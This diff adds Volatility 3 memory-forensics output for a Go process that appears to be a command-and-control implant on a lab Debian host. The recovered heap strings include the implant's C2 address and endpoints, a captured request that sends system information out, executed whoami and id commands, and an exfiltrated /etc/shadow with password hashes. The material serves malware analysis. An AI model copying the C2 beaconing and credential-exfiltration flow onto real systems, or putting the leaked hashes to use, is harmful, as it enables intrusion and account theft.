@@ -1,0 +1,1388 @@
+Volatility 3 Framework 2.27.1
+
+Result
+[+] Found ELF at 0x400000
+
+[*] Scanning for pclntab in RODATA: 0x6a8000-0x9759d8
+[+] Found pclntab at 0x7bf7c0
+
+[*] Scanning for moduledata in RW segment: 0x976000-0xa022a0
+
+ ========== SLICE POINTER ANALYSIS ==========
+ Go Version: go1.25.5
+ Is Go 1.18+: True
+
+ Base addresses:
+  moduledata: 0x979fc0
+-------------------
+  text: 0x401000
+  text: 0x6a7650
+-------------------
+  bss: 0x9c0620
+  ebss: 0x9e2fe8
+-------------------
+  types: 0x6a8000
+  etypes: 0x7bc659
+-------------------
+Types and RODATA overlapping is NORMAL:In Go binaries, the types section is embedded within the RODATA segment. This is by design.
+  rodata: 0x6a8000
+  erodata: 0x9759d8
+-------------------
+  data: 0x9b4020
+  edata: 0x9c0612
+-------------------
+  gofunc: 0x751578
+  funcnametab: ptr=0x7bf820, len=314040, cap=314040
+  cutab: ptr=0x80c2e0, len=15744, cap=15744
+  filetab: ptr=0x810060, len=28880, cap=28880
+  pctab: ptr=0x817140, len=854480, cap=854480
+  pclntable: ptr=0x8e7b20, len=581304, cap=581304
+  ftab: ptr=0x8e7b20, len=6309, cap=6309
+[+] Found moduledata at 0x979fc0
+    text: 0x401000-0x6a7650
+    types: 0x6a8000-0x7bc659
+    data: 0x9b4020-0x9c0612
+    rodata: 0x6a8000-0x9759d8
+    typelinks: 1833 entries @ 0x7bd220
+    itablink: 284 entries @ 0x7beee0
+
+================================================================================
+FUNCNAMETAB RAW DATA INSPECTION
+================================================================================
+funcnametab ptr: 0x7bf820
+funcnametab len: 314040
+================================================================================
+
+typelinks: ptr=0x7bd220, len=1833
+types section: 0x6a8000-0x7bc659
+
+==========================================================================================================================================================================
+GO RUNTIME INFORMATION
+==========================================================================================================================================================================
+PID: 2795
+COMM: client.bin
+[*] Go version detected: go1.25.5
+Functions: 6308
+==========================================================================================================================================================================
+[*] Scanning types section: 0x6a8000-0x7bc659
+[*] Types section size: 1132121 bytes
+length of types_dict: 3330
+
+================================================================================
+TYPES_DICT
+================================================================================
+
+Types by kind:
+  22 (pointer): 1079
+  25 (struct): 1014
+  17 (array): 261
+  19 (func): 258
+  23 (slice): 249
+  20 (interface): 108
+  21 (map): 73
+  2 (int): 53
+  1 (bool): 45
+  8 (uint8): 33
+  18 (chan): 28
+  24 (string): 24
+  4 (int16): 16
+  6 (int64): 15
+  10 (uint32): 11
+  3 (int8): 11
+  9 (uint16): 11
+  12 (uintptr): 11
+  16 (complex128): 8
+  5 (int32): 7
+  7 (uint): 7
+  11 (uint64): 4
+  26 (unsafe.Pointer): 1
+  14 (float64): 1
+  15 (complex64): 1
+  13 (float32): 1
+
+[*] Extracting 284 itabs from itablink @ 0x7beee0
+[+] Successfully parsed 284 itabs
+length of itabs_dict: 284
+
+================================================================================
+HEAP ANALYSIS
+
+[*] Searching for allspans slice in 2 regions...
+[*] Scanning data: 0x9b4020-0x9c0612
+Scanning range: 0x9b4020 - 0x9c0612
+ Total candidates found: 5
+[*] Scanning bss: 0x9c0620-0x9e2fe8
+Scanning range: 0x9c0620 - 0x9e2fe8
+[+] CONFIRMED valid allspans at 0x9dc4a8
+[*] mheap_ address: 0x9dc4a8
+
+[*] Enumerating 401 spans...
+    Progress: 100/401 (75 in-use)
+    Progress: 200/401 (170 in-use)
+    Progress: 300/401 (231 in-use)
+    Progress: 400/401 (244 in-use)
+
+[*] Span Statistics:
+    Total spans:     401
+    Null pointers:   0
+    In-use (state=1): 244
+    Dead (state=0):   138
+    Manual (state=2): 19
+    Parse errors:     0
+    Invalid:          0
+
+================================================================================
+HEAP ANALYSIS
+================================================================================
+
+Total spans: 244
+Total heap memory: 2.22 MB
+
+
+================================================================================
+HEAP OBJECT SUMMARY
+================================================================================
+
+Total heap_objects: 4359
+Total memory: 619.09 KB (0.60 MB)
+
+[*] Found 1410 types that can contain strings
+[*] Found 69 map types
+[*] Mapped 68 unique sizes to string-containing types
+
+[*] Starting recursive string extraction...
+[*] Processing 4359 heap objects
+
+[*] Scanning standalone 16-byte string headers...
+
+[*] Scanning for direct slice headers (24-byte objects)...
+    Found 610 potential hmap addresses
+
+[+] Phase 5: Found 103 maps with 15 strings
+
+================================================================================
+RECURSIVE STRING EXTRACTION SUMMARY
+================================================================================
+Objects processed: 4212
+Objects with strings: 248
+Maps found: 103
+Strings from maps: 15
+Total strings found: 509
+================================================================================
+
+
+====================================================================================================
+STRING STRUCTURES (HEAP) ---> DATA BYTES IN (DATA/RODATA/TEXT/TYPES)
+====================================================================================================
+Struct Addr          Data Addr            Length     Value                                                        Struct Location       Data Location      
+----------------------------------------------------------------------------------------------------
+0xc0001220b0         0x73561d             8          "SHA3-224"                                                  heap                 rodata              
+0xc000108040         0x7b49c7             10         "rsa1024min"                                                heap                 rodata              
+0xc000126010         0x735081             7          ":method"                                                   heap                 rodata              
+0xc000126028         0x737739             14         "accept-charset"                                            heap                 rodata              
+0xc000108180         0x7b4950             20         "httplaxcontentlength"                                      heap                 rodata              
+0xc000108268         0x7b49f7             9          "tlsrsakex"                                                 heap                 rodata              
+0xc000108010         0x7b4a93             15         "x509usepolicies"                                           heap                 rodata              
+0xc00006c0f8         0x735ccd             10         "/dev/stdin"                                                heap                 rodata              
+0xc00006c220         0x734f05             6          "SHA-NI"                                                    heap                 rodata              
+0xc00006c270         0xc00002202e         8          "/usr/bin"                                                  heap                 heap                
+0xc00006c158         0x736203             11         "/dev/stdout"                                               heap                 rodata              
+0xc00006c1e0         0x734f9b             6          "sha256"                                                    heap                 rodata              
+0xc00006c1f0         0x734aa3             4          "AVX2"                                                      heap                 rodata              
+0xc00006c280         0xc000022037         5          "/sbin"                                                     heap                 heap                
+0xc00006c290         0xc00002203d         4          "/bin"                                                      heap                 heap                
+0xc00006c1b8         0x73620e             11         "/dev/stderr"                                               heap                 rodata              
+0xc00006c240         0xc000022005         15         "/usr/local/sbin"                                           heap                 heap                
+0xc00006c250         0xc000022015         14         "/usr/local/bin"                                            heap                 heap                
+0xc000122088         0x7365c0             11         "SHA-512/224"                                               heap                 rodata              
+0xc00012a010         0x734b99             5          ":path"                                                     heap                 rodata              
+0xc000122180         0x7352b8             7          "SHA-224"                                                   heap                 rodata              
+0xc000122010         0x734c93             5          "SHA-1"                                                     heap                 rodata              
+0xc00012a180         0x7356c5             8          "if-match"                                                  heap                 rodata              
+0xc000124030         0x7356a5             8          "2.5.4.10"                                                  heap                 rodata              
+0xc000124050         0x735328             7          "2.5.4.8"                                                   heap                 rodata              
+0x9c1cc0             0x734b26             5          "linux"                                                     heap                 rodata              
+0xc000126088         0x7389c4             17         "if-modified-since"                                         heap                 rodata              
+0xc000124010         0x73530c             7          "2.5.4.6"                                                   heap                 rodata              
+0xc00012a0b0         0x736665             11         "retry-after"                                               heap                 rodata              
+0xc00002c390         0xc000108708         3          "t`B"                                                       heap                 heap                
+0xc000108500         0xc00001c000         9          "LS_COLORS"                                                 heap                 heap                
+0xc0001085e8         0xc000014050         7          "LOGNAME"                                                   heap                 heap                
+0xc000126040         0x737197             13         "authorization"                                             heap                 rodata              
+0xc00007e220         0xc000014090         8          "SUDO_UID"                                                  heap                 heap                
+0xc00007e348         0x734901             3          "ftp"                                                       heap                 rodata              
+0xc000126268         0x7397c4             19         "content-disposition"                                       heap                 rodata              
+0xc00002c3a0         0x734b21             5          "uname"                                                     heap                 rodata              
+0xc00002c3b0         0x73480e             3          "-rn"                                                       heap                 rodata              
+0xc00012a088         0x73496f             4          "link"                                                      heap                 rodata              
+0x7ac2e0             0x743ad2             41         "time: Reset called on uninitialized Timer"                 heap                 rodata              
+0x7ac570             0x742e45             39         "math/big: buffer too small to fit value"                   heap                 rodata              
+0x7ac5d0             0x7460eb             47         "flow control update exceeds maximum window size"           heap                 rodata              
+0x7aca90             0x74709a             50         "runtime.Pinner: object was allocated into an arena"        heap                 rodata              
+0xc00007a910         0x73499b             4          "&gt;"                                                      heap                 rodata              
+0xc000108390         0xc00001a000         12         "SUDO_COMMAND"                                              heap                 heap                
+0xc00010e5b8         0x734abf             4          "icmp"                                                      heap                 rodata              
+0xc00010e5d0         0x734ac3             4          "igmp"                                                      heap                 rodata              
+0xc00010e4f0         0x7348f8             3          "cgo"                                                       heap                 rodata              
+0xc00010e508         0x735bef             9          "files,dns"                                                 heap                 rodata              
+0xc00010e550         0x7348fb             3          "dns"                                                       heap                 rodata              
+0xc000126748         0x73ec77             31         "encrypted client hello required"                           heap                 rodata              
+0xc00007e378         0x734ad3             4          "smtp"                                                      heap                 rodata              
+0xc00007e3c0         0x734f29             6          "telnet"                                                    heap                 rodata              
+0xc0001267f8         0x73781f             15         "bad certificate"                                           heap                 rodata              
+0xc00007e4b8         0x734ccf             5          "pop3s"                                                     heap                 rodata              
+0xc0001400b0         0x74015a             33         "/memory/classes/heap/stacks:bytes"                         heap                 rodata              
+0xc00007e520         0x736dae             13         "STREAM_CLOSED"                                             heap                 rodata              
+0xc000126718         0x737810             15         "record overflow"                                           heap                 rodata              
+0xc000126730         0x736cf8             13         "access denied"                                             heap                 rodata              
+0xc00007e5d0         0x7372f5             14         "INTERNAL_ERROR"                                            heap                 rodata              
+0xc0001440b0         0x73e7e2             30         "/sync/mutex/wait/total:seconds"                            heap                 rodata              
+0xc00007e4f0         0x73544d             8          "NO_ERROR"                                                  heap                 rodata              
+0xc00007e508         0x738b15             18         "FLOW_CONTROL_ERROR"                                        heap                 rodata              
+0xc00007e550         0x7384a7             17         "COMPRESSION_ERROR"                                         heap                 rodata              
+0xc00002c450         0xc000108a88         3          "
+iS"                                                       heap                 heap                
+0xc00002c480         0xc000020240         8          "rkclient"                                                  heap                 heap                
+0xc000144030         0x73ded0             29         "/cpu/classes/user:cpu-seconds"                             heap                 rodata              
+0xc000144050         0x73f111             31         "/memory/classes/heap/free:bytes"                           heap                 rodata              
+0xc00002c490         0xc000020249         14         "6.1.0-41-amd64"                                            heap                 heap                
+0xc000144010         0x742105             37         "/cpu/classes/gc/mark/idle:cpu-seconds"                     heap                 rodata              
+0xc00006c2d8         0x735859             9          "/dev/null"                                                 heap                 rodata              
+0xc00006c338         0x734773             2          "|0"                                                        heap                 rodata              
+0xc00006c398         0x734775             2          "|1"                                                        heap                 rodata              
+0xc00007d9e0         0xc0000d8000         5          "root
+"                                                     heap                 heap                
+0xc00007da40         0x734963             4          "stat"                                                      heap                 rodata              
+0xc00007da50         0xc0000201f8         20         "/usr/local/bin/uname"                                      heap                 heap                
+0xc00007dad0         0x734b4e             5          "close"                                                     heap                 rodata              
+0xc00007da20         0xc0000201c8         21         "/usr/local/sbin/uname"                                     heap                 heap                
+0xc00006c4a0         0xc000022024         9          "/usr/sbin"                                                 heap                 heap                
+0xc000108aa8         0xc000014060         4          "HOME"                                                      heap                 heap                
+0xc000108710         0xc000020018         4          "MAIL"                                                      heap                 heap                
+0xc000108ce8         0xc000022000         4          "PATH"                                                      heap                 heap                
+0xc00007daa0         0xc000228000         24         "rkclient 6.1.0-41-amd64
+"                                  heap                 heap                
+0xc0000ac090         0xc0000b2008         3          "'^V"                                                       heap                 heap                
+0xc0000b2268         0xc000014070         4          "LANG"                                                      heap                 heap                
+0xc0000a2090         0xc0001a6000         5          "root
+"                                                     heap                 heap                
+0x7ac550             0x740837             34         "adding nil Certificate to CertPool"                        heap                 rodata              
+0xc0000fc000         0x734808             3          "GET"                                                       heap                 rodata              
+0xc0000b2040         0xc000014010         5          "SHELL"                                                     heap                 heap                
+0xc000200180         0xc00023a068         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0000b2010         0xc000014080         4          "USER"                                                      heap                 heap                
+0xc0001bef18         0x735485             8          "HTTP/1.1"                                                  heap                 rodata              
+0xc0001fac68         0x734b1c             5          "Token"                                                     heap                 rodata              
+0xc0001bebc0         0xc0001b61b8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001820e0         0xc0001b6000         12         "Description:"                                              heap                 heap                
+0xc000180320         0xc000194420         2          "US"                                                        heap                 heap                
+0xc000180350         0xc000194440         15         "Pantegana, Inc."                                           heap                 heap                
+0xc000180340         0xc000194430         10         "The Sewers"                                                heap                 heap                
+0xc000180330         0xc000194422         6          "Hawaii"                                                    heap                 heap                
+0xc0001ee780         0xc00018e0f0         17         "Pantegana Root CA"                                         heap                 heap                
+0xc0001803b0         0xc000194428         2          "US"                                                        heap                 heap                
+0xc0001803e0         0xc000194480         15         "Pantegana, Inc."                                           heap                 heap                
+0xc0001803d0         0xc000194470         10         "The Sewers"                                                heap                 heap                
+0xc0001803c0         0xc00019442a         6          "Hawaii"                                                    heap                 heap                
+0xc0001ee878         0xc00019447a         3          "abc"                                                       heap                 heap                
+0xc000180400         0xc000194490         9          "localhost"                                                 heap                 heap                
+0xc000264000         0x734953             4          "POST"                                                      heap                 rodata              
+0xc0001bef80         0xc0001b61e8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc00028a028         0xc0001b6060         5          "https"                                                     heap                 heap                
+0xc00028a038         0xc00018e0d8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0000fc080         0xc0000f8038         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0000b6120         0xc0000f8030         5          "https"                                                     heap                 heap                
+0xc0000b6158         0xc0000f804b         7          "/getcmd"                                                   heap                 heap                
+0xc0002661a0         0xc00023a2a0         5          "https"                                                     heap                 heap                
+0xc000266178         0xc000208180         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0000fc440         0xc0000f8188         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0000b6240         0xc0000f8180         5          "https"                                                     heap                 heap                
+0xc0000b6278         0xc0000f819b         7          "/getcmd"                                                   heap                 heap                
+0xc000182880         0xc0000141e0         16         "5112caedfb3a4a17"                                          heap                 heap                
+0xc0001a0c60         0xc0001b6360         5          "https"                                                     heap                 heap                
+0xc0001a0c88         0xc0001b6368         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001a0c98         0xc0001b637b         10         "/cmdoutput"                                                heap                 heap                
+0xc000182a80         0x735766             9          "text/html"                                                 heap                 rodata              
+0x9c1c40             0x734b6c             5          "Local"                                                     heap                 rodata              
+0xc00019a200         0xc000194220         3          "LMT"                                                       heap                 heap                
+0xc00019a220         0xc000194223         3          "CDT"                                                       heap                 heap                
+0xc00019a240         0xc000194226         3          "CST"                                                       heap                 heap                
+0xc00019a260         0xc000194229         3          "CST"                                                       heap                 heap                
+0xc00019a280         0xc00019422c         3          "EST"                                                       heap                 heap                
+0xc00019a2a0         0xc000194230         3          "CWT"                                                       heap                 heap                
+0xc00019a2c0         0xc000194233         3          "CPT"                                                       heap                 heap                
+0xc00019a2e0         0xc000194236         3          "CST"                                                       heap                 heap                
+0x9c1c80             0xc00018e0a8         22         "CST6CDT,M3.2.0,M11.1.0"                                    heap                 heap                
+0xc000250148         0xc00023a270         5          "https"                                                     heap                 heap                
+0xc000250158         0xc000208168         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001800d0         0xc00019424a         6          "Hawaii"                                                    heap                 heap                
+0xc000180160         0xc0001942d0         6          "Hawaii"                                                    heap                 heap                
+0x9b8c00             0x7379e1             15         "asyncpreemptoff"                                           heap                 rodata              
+0xc00018c090         0xc00010c400         44         "Description:	Debian GNU/Linux 12 (bookworm)
+"              heap                 heap                
+0xc0001820f0         0xc0001b600d         30         "Debian GNU/Linux 12 (bookworm)"                            heap                 heap                
+0x9b8bc0             0x738c59             18         "adaptivestackstart"                                        heap                 rodata              
+0xc0001c2008         0x6aefcd             2          "os"                                                        heap                 rodata              
+0xc0001c2018         0xc000194060         2          "os"                                                        heap                 heap                
+0xc000198080         0xc0001c8000         164        "{"os":"linux","arch":"amd64","name":"rkclient","User":{"name":"root","uid":"0","groups":"root"},"distro":"Debian GNU/Linux 12 (bookworm)","kernel":"6.1.0-41-amd64"}"heap                 heap                
+0xc0001be580         0xc0001b6068         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001a01e8         0xc0001b607b         7          "/getcmd"                                                   heap                 heap                
+0xc000198290         0xc000299000         4096       "POST /sysinfo HTTP/1.1
+Host: 192.168.20.123:1337
+User-Agent: Go-http-client/1.1
+Content-Length: 164
+Content-Type: application/json
+Token: 5112caedfb3a4a17
+Accept-Encoding: gzip
+
+{"os":"linux","arch":"amd64","name":"rkclient","User":{"name":"root","uid":"0","groups":"root"},"distro":"Debian GNU/Linux 12 (bookworm)","kernel":"6.1.0-41-amd64"}"heap                 heap                
+0xc0001983a0         0xc00019461e         2          "26"                                                        heap                 heap                
+0x9b4bc0             0x742e93             39         "http: putIdleConn: keep alives disabled"                   heap                 rodata              
+0x9b4bf0             0x744f65             44         "http: putIdleConn: too many idle connections"              heap                 rodata              
+0xc0001983b0         0xc000188b80         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc0001806b0         0xc00019463c         2          "id"                                                        heap                 heap                
+0xc0001804b0         0xc000194590         6          "whoami"                                                    heap                 heap                
+0xc000302038         0xc00009e090         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc00021e1b0         0xc00023a060         5          "https"                                                     heap                 heap                
+0xc00021e1e8         0xc00023a07b         8          "/sysinfo"                                                  heap                 heap                
+0xc0001a0480         0xc0001b61b0         5          "https"                                                     heap                 heap                
+0xc0001a04b8         0xc0001b61cb         10         "/cmdoutput"                                                heap                 heap                
+0xc0001a07e0         0xc0001b6240         5          "https"                                                     heap                 heap                
+0xc0001a0808         0xc0001b6248         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001a0818         0xc0001b625b         10         "/cmdoutput"                                                heap                 heap                
+0xc000272660         0xc000278000         4096       "HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Dec 2025 23:49:55 GMT
+Content-Length: 26
+Content-Type: text/plain; charset=utf-8
+
+Successfully posted output"heap                 heap                
+0xc00018d230         0xc000229000         5          "root
+"                                                     heap                 heap                
+0xc00019c500         0xc000014030         9          "SUDO_USER"                                                 heap                 heap                
+0xc0001a05a0         0xc0001b61e0         5          "https"                                                     heap                 heap                
+0xc0001a05d8         0xc0001b61fb         7          "/getcmd"                                                   heap                 heap                
+0xc00028a158         0xc00018e1f8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc000095620         0xc000314000         4096       "HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Dec 2025 23:49:57 GMT
+Content-Length: 26
+Content-Type: text/plain; charset=utf-8
+
+Successfully posted output"heap                 heap                
+0xc00018d6e0         0xc0000d9400         39         "uid=0(root) gid=0(root) groups=0(root)
+"                   heap                 heap                
+0xc00018d940         0xc000188d40         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc00019c740         0xc000014040         3          "PWD"                                                       heap                 heap                
+0xc000304150         0x73487d             3          "tcp"                                                       heap                 rodata              
+0xc000302158         0xc00009e0f0         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc000318960         0xc00031e000         4096       "HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Dec 2025 23:50:00 GMT
+Content-Length: 26
+Content-Type: text/plain; charset=utf-8
+
+Successfully posted output"heap                 heap                
+0xc00018dad0         0xc000229400         298        "x        tty1         2025-12-27 17:05
+x        pts/0        2025-12-27 17:05 (192.168.20.42)
+x        pts/1        2025-12-27 17:49 (192.168.20.42)
+x        pts/2        2025-12-27 16:55 (192.168.20.42)
+x        pts/3        2025-12-27 16:55 (192.168.20.42)
+x        pts/4        2025-12-27 17:05
+"heap                 heap                
+0xc000182830         0xc00019ce08         3          "5\h"                                                       heap                 heap                
+0xc0001829b0         0xc000194834         11         "/etc/shadow"                                               heap                 heap                
+0xc00018dd30         0xc000188e80         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc00019ce88         0xc000014020         8          "SUDO_GID"                                                  heap                 heap                
+0xc0001bf5c0         0xc0001b62d8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001a0a20         0xc0001b62d0         5          "https"                                                     heap                 heap                
+0xc0001a0a58         0xc0001b62eb         10         "/cmdoutput"                                                heap                 heap                
+0xc000319bc0         0xc00032a000         4096       "HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Dec 2025 23:50:06 GMT
+Content-Length: 26
+Content-Type: text/plain; charset=utf-8
+
+Successfully posted output"heap                 heap                
+0xc00018dec0         0xc000220800         748        "root:$y$j9T$FLXb8uv9M83ZY/ROMEAL21$AdX.RJtCqn52jn6MClbtlAOcfHBugD3Hi..2J0wgBC2:20449:0:99999:7:::
+daemon:*:20449:0:99999:7:::
+bin:*:20449:0:99999:7:::
+sys:*:20449:0:99999:7:::
+sync:*:20449:0:99999:7:::
+games:*:20449:0:99999:7:::
+man:*:20449:0:99999:7:::
+lp:*:20449:0:99999:7:::
+mail:*:20449:0:99999:7:::
+news:*:20449:0:99999:7:::
+uucp:*:20449:0:99999:7:::
+proxy:*:20449:0:99999:7:::
+www-data:*:20449:0:99999:7:::
+backup:*:20449:0:99999:7:::
+list:*:20449:0:99999:7:::
+irc:*:20449:0:99999:7:::
+_apt:*:20449:0:99999:7:::
+nobody:*:20449:0:99999:7:::
+systemd-network:!*:20449::::::
+systemd-timesync:!*:20449::::::
+messagebus:!:20449::::::
+sshd:!:20449::::::
+x:$y$j9T$hLZyc/4FGGEXacpfi8lu5.$VzWbFGXN5AdS.WYGubMXbwibtDvrmQoi7fgNE8.O1K8:20449:0:99999:7:::
+"heap                 heap                
+0xc000182a30         0xc00019d508         3          "*'D"                                                       heap                 heap                
+0xc0001fbce8         0x736716             12         "Content-Type"                                              heap                 rodata              
+0xc00019d768         0xc000014008         5          "SHLVL"                                                     heap                 heap                
+0xc0002560b0         0x734993             4          "Host"                                                      heap                 rodata              
+0xc0002021f0         0x737d47             16         "application/json"                                          heap                 rodata              
+0xc000202150         0xc000254008         3          "E2$"                                                       heap                 heap                
+0xc000256010         0x7378e2             15         "Accept-Encoding"                                           heap                 rodata              
+0xc0002540b0         0x7349a3             4          "Etag"                                                      heap                 rodata              
+0xc000256030         0x735d95             10         "Connection"                                                heap                 rodata              
+0xc000256050         0x736105             10         "Content-Id"                                                heap                 rodata              
+0xc000180260         0x73629d             11         "http2client"                                               heap                 rodata              
+0xc0001876e0         0xc000298000         4096       "HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Dec 2025 23:49:44 GMT
+Content-Length: 35
+Content-Type: text/plain; charset=utf-8
+
+Successfully got system information"heap                 heap                
+0xc000264580         0xc00023a278         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc00021e308         0xc00023a28b         7          "/getcmd"                                                   heap                 heap                
+0xc000264800         0xc00023a2a8         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc00021e428         0xc00023a2bb         7          "/getcmd"                                                   heap                 heap                
+0x9c1cd0             0x734b2b             5          "amd64"                                                     heap                 rodata              
+0xc000016000         0x7ffc040217e7       12         "./client.bin"                                              heap                 heap                
+0xc000016060         0x7b4a82             14         "x509sha256skid"                                            heap                 rodata              
+0xc000016070         0x7b4a75             10         "x509rsacrt"                                                heap                 rodata              
+0xc000016080         0x7b4a60             18         "x509negativeserial"                                        heap                 rodata              
+0xc000016090         0x7b4a4e             15         "x509keypairleaf"                                           heap                 rodata              
+0xc0000160a0         0x7b4a41             10         "winsymlink"                                                heap                 rodata              
+0xc0000160b0         0x7b4a2d             17         "winreadlinkvolume"                                         heap                 rodata              
+0xc0000160c0         0x7b4a1c             14         "updatemaxprocs"                                            heap                 rodata              
+0xc0000160d0         0x7b4a0d             12         "tlsunsafeekm"                                              heap                 rodata              
+0xc0000160e0         0x7b4a03             7          "tlssha1"                                                   heap                 rodata              
+0xc000016100         0x7b49ec             8          "tlsmlkem"                                                  heap                 rodata              
+0xc000016110         0x7b49e2             7          "tls3des"                                                   heap                 rodata              
+0xc000016120         0x7b49d4             11         "tls10server"                                               heap                 rodata              
+0xc000016140         0x7b49b9             11         "randseednop"                                               heap                 rodata              
+0xc000016150         0x7b49ae             8          "panicnil"                                                  heap                 rodata              
+0xc000016160         0x7b49a3             8          "netedns0"                                                  heap                 rodata              
+0xc000016170         0x7b4994             12         "multipathtcp"                                              heap                 rodata              
+0xc000016180         0x7b4976             27         "httpservecontentkeepheaders"                               heap                 rodata              
+0xc000016190         0x7b4967             12         "httpmuxgo121"                                              heap                 rodata              
+0xc0000161b0         0x7b493d             16         "httpcookiemaxnum"                                          heap                 rodata              
+0xc0000161c0         0x7b492e             12         "gotypesalias"                                              heap                 rodata              
+0xc0000161d0         0x7b4918             19         "gotestjsonbuildtext"                                       heap                 rodata              
+0xc0000161e0         0x7b4905             16         "decoratemappings"                                          heap                 rodata              
+0xc0000161f0         0x7b48f1             17         "containermaxprocs"                                         heap                 rodata              
+0xc000016200         0x7b48e0             14         "asynctimerchan"                                            heap                 rodata              
+0xc000016260         0x737227             12         "failfipscast"                                              heap                 rodata              
+0xc000016270         0x73570e             7          "fips140"                                                   heap                 rodata              
+0xc000016280         0x74240e             37         "cipher: message authentication failed"                     heap                 rodata              
+0xc0000162d0         0x7389f7             17         "divisor too large"                                         heap                 rodata              
+0xc0000162e0         0x74578d             45         "crypto/rsa: message too long for RSA key size"             heap                 rodata              
+0xc0000162f0         0x73d91c             28         "crypto/rsa: decryption error"                              heap                 rodata              
+0xc000016300         0x73e9fe             30         "crypto/rsa: verification error"                            heap                 rodata              
+0xc00007cf30         0x735375             7          "fips140"                                                   heap                 rodata              
+0x9becc0             0x736c4a             12         "gotypesalias"                                              heap                 rodata              
+0x9bed40             0x73614b             10         "http2debug"                                                heap                 rodata              
+0x9bed80             0x736292             11         "http2server"                                               heap                 rodata              
+0x9bedc0             0x737d97             16         "httpcookiemaxnum"                                          heap                 rodata              
+0x9bee00             0x7399e5             20         "httplaxcontentlength"                                      heap                 rodata              
+0x9bee40             0x7367ee             12         "httpmuxgo121"                                              heap                 rodata              
+0x9bee50             0x7356fd             8          "net/http"                                                  heap                 rodata              
+0xc00007d990         0xc000020168         21         "/usr/local/bin/groups"                                     heap                 heap                
+0xc00007d960         0xc000020138         22         "/usr/local/sbin/groups"                                    heap                 heap                
+0xc00010f1e8         0x735c91             10         "server.crt"                                                heap                 rodata              
+0xc00010f2b8         0x734943             4          "cert"                                                      heap                 rodata              
+0xc00007d9c0         0xc000014200         16         "/usr/sbin/groups"                                          heap                 heap                
+0xc0000163a0         0x734d01             6          "groups"                                                    heap                 rodata              
+0xc0000163b0         0x735851             8          "execwait"                                                  heap                 rodata              
+0xc000090000         0x734d07             6          "whoami"                                                    heap                 rodata              
+0xc0000900f0         0x734b17             5          "https"                                                     heap                 rodata              
+0xc000090100         0x73724d             14         "192.168.20.123"                                            heap                 rodata              
+0x9b5250             0x738217             16         "context canceled"                                          heap                 rodata              
+0x9b52c0             0x736083             10         "/etc/hosts"                                                heap                 rodata              
+0xc0000901f0         0x7349b3             4          "gzip"                                                      heap                 rodata              
+0xc000090350         0x738b6f             18         "Go-http-client/1.1"                                        heap                 rodata              
+0x9b55a0             0x737cde             15         "not in a cgroup"                                           heap                 rodata              
+0xc000180000         0x7361e2             11         "lsb_release"                                               heap                 rodata              
+0xc000192168         0xc0002b8480         794        "2025/12/27 17:50:06 [+] Sending back output:
+root:$y$j9T$FLXb8uv9M83ZY/ROMEAL21$AdX.RJtCqn52jn6MClbtlAOcfHBugD3Hi..2J0wgBC2:20449:0:99999:7:::
+daemon:*:20449:0:99999:7:::
+bin:*:20449:0:99999:7:::
+sys:*:20449:0:99999:7:::
+sync:*:20449:0:99999:7:::
+games:*:20449:0:99999:7:::
+man:*:20449:0:99999:7:::
+lp:*:20449:0:99999:7:::
+mail:*:20449:0:99999:7:::
+news:*:20449:0:99999:7:::
+uucp:*:20449:0:99999:7:::
+proxy:*:20449:0:99999:7:::
+www-data:*:20449:0:99999:7:::
+backup:*:20449:0:99999:7:::
+list:*:20449:0:99999:7:::
+irc:*:20449:0:99999:7:::
+_apt:*:20449:0:99999:7:::
+nobody:*:20449:0:99999:7:::
+systemd-network:!*:20449::::::
+systemd-timesync:!*:20449::::::
+messagebus:!:20449::::::
+sshd:!:20449::::::
+x:$y$j9T$hLZyc/4FGGEXacpfi8lu5.$VzWbFGXN5AdS.WYGubMXbwibtDvrmQoi7fgNE8.O1K8:20449:0:99999:7:::
+
+"heap                 heap                
+0xc0001800b0         0xc0001ce000         197        "{
+ "os": "linux",
+ "arch": "amd64",
+ "name": "rkclient",
+ "User": {
+  "name": "root",
+  "uid": "0",
+  "groups": "root"
+ },
+ "distro": "Debian GNU/Linux 12 (bookworm)",
+ "kernel": "6.1.0-41-amd64"
+}"heap                 heap                
+0xc0001800c0         0xc000194248         2          "US"                                                        heap                 heap                
+0xc0001800e0         0xc000194290         10         "The Sewers"                                                heap                 heap                
+0xc0001800f0         0xc0001942a0         15         "Pantegana, Inc."                                           heap                 heap                
+0xc000180100         0xc00018e0c0         17         "Pantegana Root CA"                                         heap                 heap                
+0xc000180150         0xc00019429a         2          "US"                                                        heap                 heap                
+0xc000180170         0xc0001942d6         10         "The Sewers"                                                heap                 heap                
+0xc000180180         0xc0001942e0         15         "Pantegana, Inc."                                           heap                 heap                
+0xc000180190         0xc0001942f0         3          "abc"                                                       heap                 heap                
+0xc0001801f0         0xc0001942f3         9          "localhost"                                                 heap                 heap                
+0xc000180440         0x736ceb             13         "tlsmaxrsasize"                                             heap                 rodata              
+0xc000180520         0xc000194610         5          "root
+"                                                     heap                 heap                
+0xc00018d660         0xc00018e210         18         "/usr/local/sbin/id"                                        heap                 heap                
+0xc00018d530         0xc000188be0         29         "Sat, 27 Dec 2025 23:49:57 GMT"                             heap                 heap                
+0xc000180720         0xc0001b6210         39         "uid=0(root) gid=0(root) groups=0(root)
